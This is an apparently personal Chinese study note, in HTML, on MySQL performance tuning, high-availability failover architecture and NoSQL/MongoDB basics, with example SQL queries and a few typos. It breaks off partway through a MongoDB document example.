+<h2><a class="anchor" aria-hidden="true" id="传统关系型数据库性能优化全攻略"></a><a href="#传统关系型数据库性能优化全攻略" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>传统关系型数据库性能优化全攻略</h2>
+<h3><a class="anchor" aria-hidden="true" id="影响性能的因素"></a><a href="#影响性能的因素" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>影响性能的因素</h3>
+<p>一、不合理的业务需求</p>
+<p>论坛发帖数实时更新、深翻页、无用功能堆积</p>
+<p>二、系统架构</p>
+<p>①数据库中存放的数据是否都合适：二进制音视频等富媒体数据、超大文本数据、流水队列数据，二级制文件可存着Key-Value数据库中，比如Titan，Pika，Fastdfs</p>
+<p>②大表拆分：水平拆分</p>
+<p>③是否合理利用cache机制</p>
+<p>将访问频繁且更新较少的数据放入Cache，比如系统配置及规则数据、活跃用户的基本信息、活跃用户的个性化定制信息、准实时的统计信息</p>
+<p>使用Memory保存使用频繁但非核心表</p>
+<p>④数据层的实现是否都是最精简</p>
+<p>场景：查看相册列表及其游客留言数量</p>
+<p>方案一：获取用户的相册列表select id, subject, url from photo where
+user_id = 1 limit 10</p>
+<p>代码中循环10次通过相片ID获取其对应的浏览次数</p>
+<p>select count(1) from photo_comment where photo_id = ?</p>
+<p>方案二：获取用户的相册列表select id, subject, url from photo where
+user_id = 1 limit 10</p>
+<p>通过程序拼装10个photo的id然后执行</p>
+<p>select count(1)，photo_id from photo_comment where photo_id in (?)
+gourp by photo_id</p>
+<p>循环单个调用变成批量获取。</p>
+<p>⑤过度依赖数据库query语句功能能导致效率低下 ，把逻辑都写在sql中实现</p>
+<p>⑥对扩展性过度追求，导致将对象拆的过于离散</p>
+<p>⑦重复执行相同的query语句</p>
+<p>⑧适度冗余-尽量减少join（互联网往往范式让步于冗余）</p>
+<p>⑨大字段垂直拆分（元数据表和信息表），大表水平拆分，选用合适的数据库类型（做连接查询时要保证字段类型一致）</p>
+<h3><a class="anchor" aria-hidden="true" id="query优化"></a><a href="#query优化" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Query优化</h3>
+<p><strong>Query优化基本思路：</strong></p>
+<p>①优化更需要优化的Query，根据Query的执行频率及消耗资源综合评定其是否需要优化</p>
+<p>优化后能给系统整体带来更大收益的Query需要优先优化。</p>
+<p>高并发低损耗VS低并发高损耗：高并发低损耗的优先优化。</p>
+<p>比如：一个sql查询一次1s一天查一次，另一个sql查一次500ms，但一天查1W次，综合查询次数带来是损耗，应该优先优化第二个sql。</p>
+<p>②定位优化对象的性能瓶颈：使用线上的数据进行优化测试，保证Explain结果的真实性</p>
+<p>瓶颈在哪里？CPU或IO？数据库擅长的是IO而非CPU计算。</p>
+<p>③明确优化目标：确定其重要性，以决定优化手段</p>
+<p>④从Explain入手：当前的执行计划，目标执行计划，如果索引离散度比较小，就不会使用到索引，离散度（distict/count）小的字段不建议创建索引</p>
+<p><strong>优化基本原则：</strong></p>
+<p>①多使用Profile（MySql性能分析工具）</p>
+<p>②永远用小结果集驱动大结果集，而非小表驱动大表</p>
+<p>③尽可能在索引中完成排序：排序时利用索引的有序性，这样结果已经有序，无需排序</p>
+<p>④只取自己需要的列</p>
+<p>⑤仅仅使用最有效的过滤条件</p>
+<p>⑥尽可能避免复杂的join和子查询（可以在设计时采用一定的冗余）</p>
+<p>绝大多数的子查询都可以用连接解决（通过左连接消除子查询）</p>
+<p>select * from table1 where column1 not exits (select column2 from
+table2)</p>
+<p>select table1.* from table1 left join table2 on table1.column1 =
+table2.column2 where table2.column2 is null</p>
+<p>⑦为了性能或功能上的需要，可以使用MySQL的HINT，如使用FORCE
+INDEX强制使用某个索引，但引入这个之后会对索引的维护带来麻烦</p>
+<p>⑧大量的排序操作影响性能，尽量减少ORDER BY , GROUP BY操作，可使用程序代理</p>
+<p>⑨对于经常更新的字符串使用char而不要使用varchar，处理变长字段比处理定长字段复杂的多</p>
+<p>对容易产生碎片的表使用OPTIMIZE TABLE</p>
+<p>重要原则</p>
+<p>1、如SQL过于复杂且性能低下，可以考虑使用多次单表查询，可能快于连接查询</p>
+<p>2、避免对大表查询时进行全表扫描，必要时考虑新建索引</p>
+<p>3、注意表之间连接的数据类型，避免不同类型数据之间的连接，否则将不会使用上索引</p>
+<p>4、相同功能的sql大小写、格式等方面保持一致，可提高cache命中率</p>
+<p>5、尽量减少对数据库的查询次数，有很多查询可以合并成一条sql，这样可以减少网络传输及MySQL语法解析等消耗</p>
+<h3><a class="anchor" aria-hidden="true" id="schema设计优化"></a><a href="#schema设计优化" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Schema设计优化</h3>
+<p>1、高效的模型设计：适度冗余，尽量较少Join；大字段垂直拆分；大表水平拆分</p>
+<p>2、合适的数据类型：选用更小的数据类型减少存储空间，降低IO资源消耗；合适的数据类型加速数据的比较</p>
+<p>3、规范</p>
+<p>数据库字符集默认使用UTF-8，如果存储emoj表情等四字节使用utf8mb4字符集</p>
+<p>禁止在线上生产环境做数据库压力测试</p>
+<p>禁止从测试、开发环境、本机直连线上生产数据库，禁止在数据库中存储明文密码</p>
+<p>禁止在数据库中存储图片、文件等大数据</p>
+<p>禁止将业务日志实时保存到数据库，建议保存到日志文件，对于统计后的结果放到MySQL中</p>
+<p>禁止线上核心业务使用MySQL存储过程、视图、触发器、Event、InnoDB外键约束等，这些容易将业务逻辑和DB耦合在一起，而且在MySQL的这些特性中存在严重的BUG</p>
+<p>业务部门的推广活动，请提前通知DBA进行服务和访问评估</p>
+<p>4、命名规范</p>
+<p>数据库、表、字段名全小写，中间以'_'分隔，长度不超过30，所有命名要用英文名，不使用拼音命名</p>
+<p>5、表结构设计规范</p>
+<p>根据访问模式，选取存储引擎</p>
+<p>有性能要求的表可定义为静态表</p>
+<p>独立的物理库使用同一存储引擎</p>
+<p>访问量大时，可考虑按功能拆库</p>
+<p>统一编码</p>
+<p>垂直水平拆分</p>
+<p>6、字段类型规范</p>
+<p>正确评估取值范围，使用恰当的类类型</p>
+<p>由应用程序保证字符串类型的长度</p>
+<p>尽少使用DATE_SUB或DATE_ADD等MySQL提供的日期函数</p>
+<p>将列的属性设置为not null，且带有默认值，</p>
+<p>避免逻辑错误</p>
+<p>弃用枚举类型ENUM</p>
+<p>7、SQL规范</p>
+<p>使用explain查看执行计划，优化器远比我们想象的要弱</p>
+<p>减少数据库的访问次数，尽量用一条高效的SQL解决所有问题，但要注意是高效的SQL</p>
+<p>尽量按照主键顺序操作记录，可以利用数据缓存</p>
+<p>对Innodb类型的表，COUNT操作要有where条件</p>
+<p>避免表扫描，如果涉及到表扫描操作，请考虑是否有其他方法代替</p>
+<p>多表连接时，请为每个表设计别名，并把列名前缀于每一列上，即使该列在所有表中都是唯一的，这样可以减少解析时间并避免由列歧义引起的语法错误</p>
+<p>与事务无关的操作放到事务外面，以减少锁资源的占用</p>
+<p>在不破坏一致性的前提下，使用多个短事务替代长事务</p>
+<h3><a class="anchor" aria-hidden="true" id="索引设计优化"></a><a href="#索引设计优化" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>索引设计优化</h3>
+<p>1、索引规范：</p>
+<p>适合添加索引的列尽量满足如下条件：出现在where或on中的列；具有较少的重复值；已查询操作为主，对于更新操作远远大于查询操作的列，请不要创建索引</p>
+<p>尽量使用短索引（短字段建立索引，长字段如string不建议建索引），短索引更容易被MySQL加载到内存中，从而达到提高读性能的目的，这点对主键尤其重要</p>
+<p>更新频繁的表，数据量较小时尽量不要建立索引，过多的索引会导致插入、更新、删除，甚至于查询性能的下降</p>
+<p>一般情况下不要使用FORCE
+INDEX强制使用某个索引，尽量让MySQL优化器决定使用哪个索引，强制使用某一索引，当DBA在做索引维护时会变得复杂</p>
+<p>尽量尽量减少对主键索引的更新，这样会导致辅助索引的更新</p>
+<p>建议做性能测试的时候根据需要禁止adaptive hash index（不再需要？）</p>
+<p>2、索引方法技巧：合理设计并利用索引，提高SQL性能</p>
+<p>较频繁作为查询条件的字段可以考虑创建索引</p>
+<p>为写多读少的表创建索引时，请充分考虑索引对写性能的影响</p>
+<p>SQL中尽量在索引里完成排序（可以把排序列加到索引中，作为复合索引）</p>
+<p>对于B-Tree复合索引（多维索引），只有where条件中包含最左前缀（复合索引中的第一列）时，MySQL才会利用复合索引（除非索引列全为数值类型列）</p>
+<p>3、注意事项</p>
+<p>唯一性太差的字段不适合单独建立索引，即使是频繁的作为查询条件</p>
+<p>更新非常频繁的字段不适合建立索引</p>
+<p>不出现在where子句中的字段不建立索引</p>
+<p>where子句中尽量不要使用like
+'%content%'，以通配符开头的字符串不会使用索引（线上可以禁止like查询，因为使用like查询就是一个搜索需求，搜索需求应该交个Elasticsearch处理）</p>
+<p>where子句中需要使索引列独立，MySQL不会利用计算后的所有列（除非该索引为数值类型的主索引）</p>
+<h3><a class="anchor" aria-hidden="true" id="锁优化"></a><a href="#锁优化" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>锁优化</h3>
+<p>1、锁分类</p>
+<p>行级锁：开销大，加锁慢；会出现死锁；锁粒度最小，发生冲突的概率最低，并发度也是最高</p>
+<p>表级锁：开销小，加锁快；不会出现死锁；锁粒度大，发生锁冲突的概率最高，并发度最低</p>
+<p>页面锁：开销和加锁时间介于表锁与行锁之间；会出现死锁；锁定粒度介于表锁和行锁之间，并发度一般</p>
+<p>2、InnoDB支持行级锁，要合理利用InnoDB的行级锁</p>
+<p>合理设计索引，让InnoDB在索引键上面加锁的时候尽可能准确，尽可能的缩小锁定范围，避免造成不必要的锁定而影响其它Query的执行</p>
+<p>尽可能让所有的数据检索都通过索引来完成，从而避免InnoDB因为无法通过索引键加锁而升级为表级锁</p>
+<p>尽可能较少基于范围的数据检索过滤条件，避免因为间隙锁带来的负面影响而锁定了不该锁定的记录</p>
+<p>尽量控制事务的大下，减少锁定的资源量和锁定时间长度</p>
+<p>实际案例：</p>
+<p>优化前：delete from download where create_time &lt; 1543469635;
+加锁范围太大，锁定时间长</p>
+<p>优化方式：建立基于crate_time的索引，并使用limit，修改为分批的执行，减少锁的时间</p>
+<p>优化后：delete from download where create_time &lt; 1543469635 limit
+50000;</p>
+<h3><a class="anchor" aria-hidden="true" id="mysql架构优化"></a><a href="#mysql架构优化" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>MySQL架构优化</h3>
+<p>1、实际案例-主库单机</p>
+<p>主库为1台DB，使用中间层，利用MySQL的复制功能，把数据同步到中间层，在通过中间层把数据同步到下面的叶子节点</p>
+<p><img src="media/image56.png" alt="">{width=&quot;2.097916666666667in&quot;
+height=&quot;1.4551202974628172in&quot;}</p>
+<p>中间件读binlog然后分发。</p>
+<p>为什么不采用主库拖从库用MySQL的自带的同步机制呢？主要是为了减少同步对主库的压力。从库越多压力越大。</p>
+<p>2、实际案例-主库多机</p>
+<p>通过Transfer可以有多台数据相同的主库，每个DB一个写推送线程，最终一致</p>
+<p><img src="media/image57.png" alt="">{width=&quot;2.2645833333333334in&quot;
+height=&quot;2.0578947944007in&quot;}</p>
+<p>cm：相当于一个消息中间件，transfer：读取消息中间件的消息，然后把数据写到后面的数据库。</p>
+<p>3、实际案例-分布式</p>
+<p>采用NewSQL，比如Spanner/F1，CockroachDB，TiDB</p>
+<p>4、目前MySQL推荐版本5.7.21</p>
+<h3><a class="anchor" aria-hidden="true" id="mysql优化"></a><a href="#mysql优化" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>MySQL优化</h3>
+<blockquote>
+<p>三大优化准则。</p>
+</blockquote>
+<ol>
+<li>索引隔离列</li>
+</ol>
+<p>如果在查询中没有隔离索引的列，mysql通常不会使用索引。&quot;隔离&quot;列意味着它不是表达式的一部分，也没有位于函数中。</p>
+<p>如：select * from user where uid + 1 = 5; 不会使用uid的索引。</p>
+<p>2、计数表</p>
+<p>我们通常会以一张专用的数据表来统计网站某些数据（如点击率等）。</p>
+<p>create table hit_cout(cnt int unsigned not null) ENGINE = InnoDB;</p>
+<p>问题是该行对于任何更新该计数器的更新事务实际上是一个全局的&quot;互斥量&quot;，无并发可言。此时，我们可以修改此表：</p>
+<p>create table hit_count(solt tinyint unsigned not null primary key, cnt
+int unsigned not null ) ENGINE=InnoDB;</p>
+<p>从而把更新请求分发到不同的solt，以提高并发性。</p>
+<p>更新：update hit_count set cnt = cnt + 1 wehre solt = RNAD()*100</p>
+<p>统计：select sum(cnt) from hit_count;</p>
+<p>3、优化Count</p>
+<p>MySQL会对没有where子句的count(1)语句进行优化，因为存储引擎总是知道表中行的数量。</p>
+<p>select count(1) from thread where id &gt; 5;</p>
+<p>MySQL对上面这条语句不会有非常多的优化，但如果id&gt;5的数量远远大于id&lt;5的行数时，我们可以采用下面的方式以提高查询效率：</p>
+<p>select (select count(1) from thread) -- count(1) from thread where
+id&lt;5;</p>
+<h3><a class="anchor" aria-hidden="true" id="范式和冗余"></a><a href="#范式和冗余" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>范式和冗余</h3>
+<blockquote>
+<p>范式和冗余没有绝对的对错，取决于具体的设计需求和性能需求（互联网往往范式让步于冗余）</p>
+<p>读多写少性能要求高的应用</p>
+<p>可以采取加入冗余数据、牺牲范式、提升性能</p>
+<p>可以放弃约束的使用，如外键约束，提升性能</p>
+<p>可以牺牲范式，较少记录数规模，如违背1NF不遵守属性不可再分</p>
+<p>负面影响：应用代码的复杂性增加，更新操作代码增大</p>
+</blockquote>
+<h2><a class="anchor" aria-hidden="true" id="传统关系型数据库高可用方案"></a><a href="#传统关系型数据库高可用方案" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>传统关系型数据库高可用方案</h2>
+<h3><a class="anchor" aria-hidden="true" id="总体架构"></a><a href="#总体架构" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总体架构</h3>
+<blockquote>
+<p>数据库高可用总体架构</p>
+</blockquote>
+<p><img src="media/image58.png" alt="">{width=&quot;4.128650481189851in&quot;
+height=&quot;4.5488232720909885in&quot;}</p>
+<p>WEB：提供数据库管理前台页面展示</p>
+<p>API：为前台页面提供API接口</p>
+<p>管理数据库：对数据库的集群进行管理</p>
+<p>集群组信息：被管理数据集群的信息，数据库，主从，IP，端口等信息</p>
+<p>VIP映射：为一主多从集群提供映射虚IP，正常情况指向主库，主库异常时指向从库</p>
+<p>是否参与巡检：数据库是否参与巡检，如每5秒钟检查一次</p>
+<p>LastError日志：记录每5秒钟巡检的返回信息，可以通过查询该表，判断数据库是否有异常</p>
+<p>Master Info：数据库主库信息</p>
+<p>系统日志</p>
+<p>检查与故障切换：</p>
+<p>HealthCheck Serve：健康状态检查服务，提供定时巡检功能</p>
+<p>FialOver Serve：发现主库异常时，从从库里面选择一个库提升为主库</p>
+<p>TGW/VIP切换：从库提升为主库时，提供VIP切换功能</p>
+<p>日志记录：</p>
+<p>数据库集群：被管理的数据库集群</p>
+<p>运行环境：系统运行在CentOS6.6 或CentOS7.4上</p>
+<h4><a class="anchor" aria-hidden="true" id="数据库如何做主从切换？"></a><a href="#数据库如何做主从切换？" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>数据库如何做主从切换？</h4>
+<h4><a class="anchor" aria-hidden="true" id="主从切换对写主读从的场景怎么处理？"></a><a href="#主从切换对写主读从的场景怎么处理？" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>主从切换对写主读从的场景怎么处理？</h4>
+<h3><a class="anchor" aria-hidden="true" id="流程"></a><a href="#流程" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>流程</h3>
+<p><img src="media/image59.tiff" alt="">{width=&quot;4.804885170603675in&quot;
+height=&quot;6.564686132983377in&quot;}</p>
+<p>挑选新主库：基于GTID，谁的GTID最大，就选谁为主库。</p>
+<p>如何实现&quot;判断从库是否可以访问主库&quot;：直接在从库的主机上连接主库即可。</p>
+<h2><a class="anchor" aria-hidden="true" id="nosql数据库应用实践"></a><a href="#nosql数据库应用实践" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>NoSQL数据库应用实践</h2>
+<h3><a class="anchor" aria-hidden="true" id="nosql基础概念"></a><a href="#nosql基础概念" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>NoSQL基础概念</h3>
+<p>NoSQL定义</p>
+<p>No! SQL OR Not Only SQL</p>
+<p>优势：读写扩展能力（业务方不再关系分库分表）、读写高性能、与Relational
+Database相辅相成</p>
+<p>NoSQL产品</p>
+<p>键值（Key-Value）存储型:Memcached、ToKyo Cabinet、<strong>Redis</strong></p>
+<p>列存储型：Cassadra，<strong>Hbase</strong></p>
+<p>图形（Graph）数据库：<strong>Neo4J</strong>、InfoGrid、Infinite Graph</p>
+<p>文档型：<strong>MongoDB</strong>、CouchDB</p>
+<p>OLAP场景主要使用Redis和MongoDB</p>
+<p>OLTP场景主要使用Hbase</p>
+<h3><a class="anchor" aria-hidden="true" id="mongodb基础概念"></a><a href="#mongodb基础概念" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>MongoDB基础概念</h3>
+<p>MongoDB概念</p>
+<p>MongoDB From
+&quot;humongous&quot;【humongous，[hjuːˈmʌŋɡəs]，巨大的，庞大的】，面向文档的NoSQL数据库。</p>
+<p>举例，RDBMS（People、Address），MongoDB（People）</p>
+<p>在RDBMS中</p>
+<p>姓名   性别   年龄   住址ID</p>
+<hr>
+<p>M      男     25     1</p>
+<p>住址ID   国家   城市   街道</p>
+<hr>
+<p>1        中国   北京   XXX街道</p>
+<p>在MongoDB中</p>
+<hr>
+<p>{<br>
+<strong>&quot;姓名&quot;</strong>: <strong>&quot;M&quot;</strong>,<br>
+<strong>&quot;性别&quot;</strong>: <strong>&quot;男&quot;</strong>,<br>
+<strong>&quot;年龄&quot;</strong>: <strong>&quot;25&quot;</strong>,<br>
+<strong>&quot;住址&quot;</strong>:{<br>
+<strong>&quot;国家&quot;</strong>: <strong>&quot;中国&quot;</strong>,<br>
+<strong>&quot;城市&quot;</strong>: <strong>&quot;北京&quot;</strong>,<br>
+<strong>&quot;街道&quot;</strong>: **&quot;XXX街道&quot;<br>
+**}<br>
